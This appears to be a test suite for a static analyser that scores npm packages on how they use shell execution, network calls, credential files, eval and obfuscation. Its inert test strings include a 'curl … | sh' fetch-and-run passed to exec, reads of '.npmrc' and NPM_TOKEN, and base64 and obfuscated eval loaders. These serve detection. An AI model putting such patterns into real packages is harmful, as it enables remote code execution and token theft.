// apm-score-v5: JavaScript and TypeScript are read from a parsed program. What a string can confirm depends on its
// role where it is used, evidence cites the occurrence that matched, and a file no parser accepts is read raw.
// Payloads are inert stand-ins.
import { describe, expect, test } from "bun:test";
import { analyze, finalize, POINTS, SCORE_FLOOR, type Analysis, type SignalId, type TarEntry } from "../src/index.ts";
import { MAX_PARSED_TOKENS } from "../src/parse.ts";
import { scanFile, scanText, type CodeSignal, type Confidence, type Lang } from "../src/source.ts";

type Found = Partial<Record<CodeSignal, Confidence>>;

function found(text: string, lang: Lang = "js"): Found {
  const out: Found = {};

  for (const f of scanText(text, lang)) if (out[f.id] !== "confirmed") out[f.id] = f.confidence;

  return out;
}

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analyzeFiles(files: Record<string, string>, main = "index.js"): Analysis {
  const manifest = { name: "probe-pkg", version: "1.0.0", license: "MIT", main };

  return analyze({ name: "probe-pkg", manifest, files: [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "a", previousPublishers: [] });
}

function evidence(a: Analysis, id: SignalId): string[] {
  return a.signals.find((s) => s.id === id)?.evidence ?? [];
}

function scoreOf(a: Analysis): number {
  return finalize(a, { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null }).score;
}

describe("a string confirms only what its role allows", () => {
  test("shell text passed to exec or spawn runs; in a URL it is sent", () => {
    expect(found("require('child_process').exec('curl -s https://example.invalid/x | sh');\n")).toEqual({ "shell-exec": "confirmed", network: "confirmed" });
    expect(found("require('child_process').spawn('sh', ['-c', 'curl -s https://example.invalid/x | sh']);\n")).toEqual({ "shell-exec": "confirmed", network: "confirmed" });
    expect(found("fetch('https://example.invalid/curl -s example.invalid | sh');\n")).toEqual({ network: "confirmed", "shell-exec": "possible" });
  });

  test("a credential path is confirmed when it is read, possible when a path is only built", () => {
    expect(found("require('fs').readFileSync(require('path').join(require('os').homedir(), '.npmrc'));\n")).toEqual({ "credential-access": "confirmed" });
    expect(found("const p = require('path').join('.npmrc');\n")).toEqual({ "credential-access": "possible" });
    expect(found("const fake = { readFileSync(x) { return x } }; fake.readFileSync('.npmrc');\n")).toEqual({ "credential-access": "possible" });
    expect(found("const read = require('fs').readFileSync; read('.npmrc');\n")).toEqual({ "credential-access": "confirmed" });
  });

  test("a module name confirms a load only where it is loaded", () => {
    expect(found("require('fs').readFileSync('child_process');\n")).toEqual({ "shell-exec": "possible" });
    expect(found("import('node:http').Anything;\n")).toEqual({ network: "confirmed" });
  });

  test("decoded text takes the role of where it is used", () => {
    const b64 = Buffer.from("require('child_process')").toString("base64");

    expect(found(`fetch('https://example.invalid', { body: '${b64}' });\n`)).toEqual({ network: "confirmed", "shell-exec": "possible", obfuscated: "possible" });
    expect(found(`eval(atob('${b64}'));\n`)).toEqual({ eval: "confirmed", "shell-exec": "confirmed", obfuscated: "confirmed" });
    expect(found(`const p = '${b64}';\neval(Buffer.from(p, 'base64').toString());\n`)).toMatchObject({ eval: "confirmed", "shell-exec": "confirmed", obfuscated: "confirmed" });
  });
});

describe("evaluated text is read as code", () => {
  for (const [label, src] of [
    ["a parenthesized Function", "(Function)(`fetch('https://example.invalid')`)();"],
    ["indirect eval", "(0, eval)(`fetch('https://example.invalid')`);"],
    ["a constructor chain", "[].constructor.constructor(`fetch('https://example.invalid')`)();"],
    ["a template holding a string", "eval(`${\"fetch('https://example.invalid')\"}`);"],
    ["a Function alias", "const Fn = globalThis.Function; Fn(\"fetch('https://example.invalid')\")();"],
    ["new Function", "new Function(\"fetch('https://example.invalid')\");"],
    ["vm", "require('vm').runInNewContext(\"fetch('https://example.invalid')\");"],
    ["a string timer", "setTimeout(\"fetch('https://example.invalid')\", 1);"],
    ["eval.call", "eval.call(null, \"fetch('https://example.invalid')\");"],
    ["Function.apply", "Function.apply(null, [\"fetch('https://example.invalid')\"])();"],
    ["Reflect.apply", "Reflect.apply(eval, null, [\"fetch('https://example.invalid')\"]);"],
    ["Reflect.construct", "Reflect.construct(Function, [\"fetch('https://example.invalid')\"])();"],
  ] as const) {
    test(`${label}: eval and the network call it runs are both confirmed`, () => {
      expect(found(src)).toMatchObject({ eval: "confirmed", network: "confirmed" });
      expect(scoreOf(analyzeFiles({ "index.js": src }))).toBe(100 + POINTS.eval + POINTS.network);
    });
  }

  test("module._compile runs code; a template engine's own _compile method does not", () => {
    expect(found("module._compile('globalThis.x = 1', 'x.js');\n")).toEqual({ eval: "confirmed" });
    expect(found("class Engine { _compile(t) { return t } render(t) { return this._compile(t) } }\n")).toEqual({});
  });

  test("a module wrapped by a compiler's interop helper is still that module", () => {
    const src = "var _cp = _interop_require_default(require('child_process'));\nvar _m = __importDefault(require('node:module'));\n_cp.default.spawn('sh');\nconst m = new _m.default('x.js');\nm._compile('globalThis.x = 1', 'x.js');\n";
    expect(found(src)).toEqual({ "shell-exec": "confirmed", eval: "confirmed" });
    expect(scanText(src).find((f) => f.id === "shell-exec")?.line).toBe(3);
  });

  test("Function('return this') finds the global object and is not eval", () => {
    expect(found("const g = Function('return this')();\n")).toEqual({});
  });

  test("an evaluated string that names a module apm cannot see is a dynamic load", () => {
    const a = analyzeFiles({ "index.js": "module.exports = (name) => Function('return require(\"' + name + '\")')();\n" });
    expect(a.signals.map((s) => s.id)).toEqual(expect.arrayContaining(["eval", "dynamic-require"]));
  });
});

describe("calls are read from the tree", () => {
  test("a definition is not a call, whatever its name, and a comment or string cannot make a call one", () => {
    expect(found("class A { async fetch(url) { return url } }\nfunction fetch(u) { return u }\nfetch('x');\n")).toEqual({});
    expect(found("fetch(/* ) { */ 'https://example.invalid');\n")).toEqual({ network: "confirmed" });
    expect(found("fetch('https://example.invalid/) {');\n")).toEqual({ network: "confirmed" });
  });

  test("optional calls and escaped identifiers are calls", () => {
    expect(found("require?.('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("requ\\u0069re('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("f\\u0065tch('https://example.invalid');\n")).toEqual({ network: "confirmed" });
    expect(found("globalThis.fetch?.('https://example.invalid');\n")).toEqual({ network: "confirmed" });
  });

  test("every way node offers to load a module by name is a load", () => {
    for (const load of ["process.getBuiltinModule", "require.main.require", "module.require", "require('module')._load"]) {
      expect(found(`${load}('child_process').spawn('sh');\n`), load).toEqual({ "shell-exec": "confirmed" });
    }
  });

  test("an internal binding counts when it can start a process, or when apm cannot read which it is", () => {
    expect(found("process.binding('spawn_sync').spawn({ file: 'sh' });\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("const name = process.argv[2];\nprocess.binding(name);\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("var types = freeProcess && freeProcess.binding && process.binding('util');\n")).toEqual({});
  });

  test("a require passed in as a parameter, the way bundles pass it, still loads", () => {
    expect(found("(function (module, exports, require) { require('child_process'); })(m, e, r);\n")).toEqual({ "shell-exec": "confirmed" });
  });

  test("`await (f)(x)` calls `await` in a script and `f` in a module, so both readings count", () => {
    const run = "const cp = process.getBuiltinModule('child_process');\nawait (cp.execSync)('curl -s https://example.invalid/x | sh');\n";
    expect(found(run)).toMatchObject({ "shell-exec": "confirmed", network: "confirmed" });
  });

  test("an object's own fetch method is possible, the global one confirmed", () => {
    expect(found("class App { fetch(r) { return r } run(x) { return this.fetch(x) } }\n")).toEqual({ network: "possible" });
    expect(found("const res = await (custom || fetch)(req);\n")).toEqual({ network: "confirmed" });
  });
});

describe("TypeScript types come from the TypeScript grammar", () => {
  test("a type import is erased; import() in code runs", () => {
    expect(found("type X = import('net').Socket;\nlet y: import('node:http').Agent;\n", "ts")).toEqual({});
    expect(found("import type { ChildProcess } from 'child_process';\n", "ts")).toEqual({});
    expect(found("import('node:http').then((m) => m);\n", "ts")).toEqual({ network: "confirmed" });
    expect(found("import cp = require('child_process');\n", "ts")).toEqual({ "shell-exec": "confirmed" });
  });

  test("a non-null assertion before a division is not a regex", () => {
    expect(found("const a = 1; const r = a! / require('child_process') / 1;\n", "ts")).toEqual({ "shell-exec": "confirmed" });
  });
});

describe("evidence cites the occurrence that matched", () => {
  test("a comment holding the joined value does not take the citation", () => {
    const a = analyzeFiles({ "index.js": "// 'fetch'\nglobalThis['fe'+'tch']('https://example.invalid');\n" });
    expect(evidence(a, "obfuscated")[0]).toStartWith("index.js:2:");
    expect(a.signals.find((s) => s.id === "obfuscated")?.confidence).toBe("confirmed");
  });

  test("an earlier ordinary string with the same value does not take the citation", () => {
    const a = analyzeFiles({ "index.js": "const x = 'child_process';\n\nrequire('chi' + 'ld_process');\n" });
    expect(evidence(a, "obfuscated")[0]).toStartWith("index.js:3:");
    expect(a.signals.find((s) => s.id === "obfuscated")?.confidence).toBe("confirmed");
  });

  test("text read raw cites the line the joined pieces start on", () => {
    // `}` closes nothing, so no parser accepts this file and it is read raw
    const raw = "});\nconst x = 'child_process';\n\n\nrequire('chi' +\n  'ld_process');\n";
    expect(scanFile(raw, "js").read).toBe("raw");
    const a = analyzeFiles({ "index.js": raw });
    expect(evidence(a, "obfuscated").some((e) => e.startsWith("index.js:5:"))).toBe(true);
  });

  test("a call is cited before the import that made it possible, and a test file says so", () => {
    const test = "import vm from 'node:vm';\n\nconst gc = vm.runInNewContext('gc');\n";
    const a = analyzeFiles({ "index.js": "module.exports = 1;\n", "src/tests/error.test.ts": test });
    const ev = evidence(a, "eval");
    expect(ev[0]).toStartWith("src/tests/error.test.ts:3: const gc = vm.runInNewContext('gc');");
    expect(ev[0]).toEndWith(" (in a test file)");
  });

  test("what the package ships is cited before what only its tests do", () => {
    const a = analyzeFiles({ "index.js": "module.exports = 1;\n", "a.test.js": "eval('1');\n", "lib/b.js": "eval('2');\n" });
    expect(evidence(a, "eval")).toEqual(["lib/b.js:1: eval('2');", "a.test.js:1: eval('1'); (in a test file)"]);
  });
});

describe("module targets apm can work out", () => {
  test("a constant import target is the module it names, not a dynamic load (hono's color helper)", () => {
    const a = analyzeFiles({ "index.js": 'const cfWorkers = "cloudflare:workers";\nexport async function f() { return (await import(cfWorkers)).env; }\n' });
    expect(a.signals.map((s) => s.id)).not.toContain("dynamic-require");
  });

  test("a constant holding a module that does something is that module", () => {
    expect(found("const m = 'node:http';\nawait import(m);\n")).toEqual({ network: "confirmed" });
  });

  test("a parameter is still a dynamic load", () => {
    const a = analyzeFiles({ "index.js": "export const load = (name) => import(name);\n" });
    expect(a.signals.map((s) => s.id)).toContain("dynamic-require");
  });

  test("JSON never runs, so a string in it is not a load", () => {
    const a = analyzeFiles({ "index.js": "require('./schema.json');\n", "schema.json": '{ "tsType": "import(x).Y" }' });
    expect(a.signals.map((s) => s.id)).not.toContain("dynamic-require");
  });
});

describe("files no parser reads are read raw (fail closed)", () => {
  test("invalid JavaScript is read raw, every match counted", () => {
    expect(scanFile("}); require('child_process');\n", "js").read).toBe("raw");
    expect(found("}); require('child_process');\n")).toEqual({ "shell-exec": "confirmed" });
    expect(found("fetch('https://example.invalid') {}\n")).toEqual({ network: "confirmed" });
  });

  test("a file too large to hold as a tree is read raw", () => {
    const big = `${"a;".repeat(MAX_PARSED_TOKENS / 2 + 10)}\n// fetch('https://example.invalid')\n`;
    const scan = scanFile(big, "js");
    expect(scan.read).toBe("raw");
    expect(scan.findings.map((f) => `${f.id}:${f.confidence}`)).toEqual(["network:confirmed"]);
  });

  test("a file node runs because code requires it is read as JavaScript, whatever its extension", () => {
    // in C a backslash continues a // comment onto the next line; in JavaScript it does not
    const a = analyzeFiles({ "index.js": "require('./native.c');\n", "native.c": "// helper \\\nrequire('child_process');\n" });
    expect(a.signals.find((s) => s.id === "shell-exec")?.confidence).toBe("confirmed");
    expect(scoreOf(a)).toBeLessThan(100);
  });

  test("a file a path only names (for a tool to read) keeps its own language", () => {
    const a = analyzeFiles({ "index.js": "const p = require('path').join(__dirname, 'Find.cs');\n", "Find.cs": "// powershell -Command \"Add-Type -Path Find.cs\"\nclass X {}\n" });
    expect(a.signals.map((s) => s.id)).not.toContain("shell-exec");
  });

  test("the floor-crossing payload is refused however it is wrapped", () => {
    const payload = "require('chi'+'ld_process');fetch('https://example.invalid');process.env.NPM_TOKEN;eval('1');";

    for (const wrap of [`// note\r${payload}`, `const of = 1; of / (${payload.replaceAll(";", ",").slice(0, -1)}) / 1;`, `<!-- /*\n${payload}\nconst end = '*/';`]) {
      expect(scoreOf(analyzeFiles({ "index.js": wrap }))).toBeLessThan(SCORE_FLOOR);
    }
  });
});
